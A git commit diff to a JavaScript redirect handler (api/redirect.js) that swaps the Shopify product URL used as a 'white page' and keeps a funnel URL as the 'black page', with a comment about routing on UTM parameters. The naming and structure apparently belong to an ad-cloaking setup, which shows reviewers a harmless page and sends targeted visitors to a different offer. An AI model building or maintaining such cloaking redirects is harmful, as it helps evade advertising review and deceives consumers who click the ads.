1d8f367093b6b2936de9964e97b7a90c9471358b
Asif-Moon <asifaslam.ch94@gmail.com>
2025-02-23 17:33:12 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://shopjunkndisorderly.myshopify.com/products/ag-chicks-112-richardson-hats?srsltid=AfmBOor-00Aa-bihk6YvooN3zLBYHqBjqTbxTvXGhI0l4ClzcgFOHr28";
+    const whitePageURL = "https://gwboutique-london.myshopify.com/collections/women/products/womens-head-t-shirt-large";
     const blackPageURL = "https://adffuaorrd.myfunnelish.com/jj-dd-spr-1738364604529104-1738364997483090-1739239513447558-1740098104992791-1740256142894750";
   
     // Parse the UTM parameters from the request URL
